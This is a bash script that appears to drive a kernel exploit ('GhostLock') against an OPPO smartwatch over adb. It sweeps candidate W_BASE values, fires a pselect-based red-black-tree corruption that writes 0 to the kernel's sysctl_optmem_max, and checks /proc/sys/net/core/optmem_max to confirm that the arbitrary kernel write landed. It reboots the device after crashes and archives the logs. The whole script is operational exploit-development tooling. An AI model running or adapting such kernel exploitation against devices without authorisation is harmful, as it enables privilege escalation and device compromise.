#!/usr/bin/env bash
# Positive-signal W_BASE sweep (see GHOSTLOCK_ORACLE in exploit/src/fops.c).
# Usage:  bash geo_oracle.sh "<label>" "<BASES>" [extra env]
# Each base fires ONE pselect attempt whose rb_erase stores 0 at
# &sysctl_optmem_max.  /proc/sys/net/core/optmem_max is one of the few sysctls
# the shell context may read on this build, so "did the PI chain actually reach
# an erase at this base" becomes a direct observation instead of a panic/no-panic
# inference.  The write value 0 also makes the probe collateral-free:
# __rb_parent(0)==NULL, so __rb_change_child only touches our own page.
export MSYS_NO_PATHCONV=1
ADB=/c/platform-tools/adb.exe
DT=/data/local/tmp
ARCH=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/captures
mkdir -p "$ARCH"
LABEL=${1:-ora}
BASES=${2:-"0 1 2 3 4"}
EXTRA=${3:-}
online() { $ADB devices 2>/dev/null | grep -q 'device$'; }
waitdev() { local m=${1:-150} w=0; while ! online; do sleep 3; w=$((w+3)); [ $w -ge $m ] && return 1; done; sleep 2; return 0; }
for b in $BASES; do
  waitdev 150 || { echo "[$LABEL] base=$b NO-DEVICE"; continue; }
  base_val=$($ADB shell "cat /proc/sys/net/core/optmem_max" 2>/dev/null | tr -d '\r')
  if [ "$base_val" != "10240" ]; then
    echo "[$LABEL] base=$b optmem=$base_val not pristine -> rebooting"
    $ADB shell reboot >/dev/null 2>&1; waitdev 200 || { echo "[$LABEL] base=$b NO-RECOVERY"; continue; }
  fi
  $ADB shell "rm -f $DT/log_*.txt; sync" 2>/dev/null
  t0=$(date +%H:%M:%S)
  timeout 90 $ADB shell "GHOSTLOCK_ORACLE=1 $EXTRA GHOSTLOCK_WBASE=$b GHOSTLOCK_ATTEMPTS=1 sh $DT/fire.sh" >/dev/null 2>&1; rc=$?
  waitdev 150 || { echo "[$LABEL] base=$b NO-RECOVERY rc=$rc"; continue; }
  after=$($ADB shell "cat /proc/sys/net/core/optmem_max" 2>/dev/null | tr -d '\r')
  $ADB shell "cat $DT/log_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r' > "$ARCH/${LABEL}_$b.log"
  L="$ARCH/${LABEL}_$b.log"
  verdict=PANIC
  grep -q 'ORACLE .*HIT' "$L" && verdict=WRITE-HIT
  [ "$after" = "0" ] && verdict=WRITE-HIT
  grep -q 'pselect returned' "$L" && [ "$verdict" = PANIC ] && verdict=RETURN-nohit
  ora=$(grep -o 'ORACLE wbase=.*' "$L" | tail -1)
  echo "[$LABEL] base=$b rc=$rc t=$t0 optmem_after=$after verdict=$verdict {$ora}"
  if [ "$verdict" = WRITE-HIT ]; then echo ">>> base $b CARRIES THE WAITER <<<"; break; fi
done
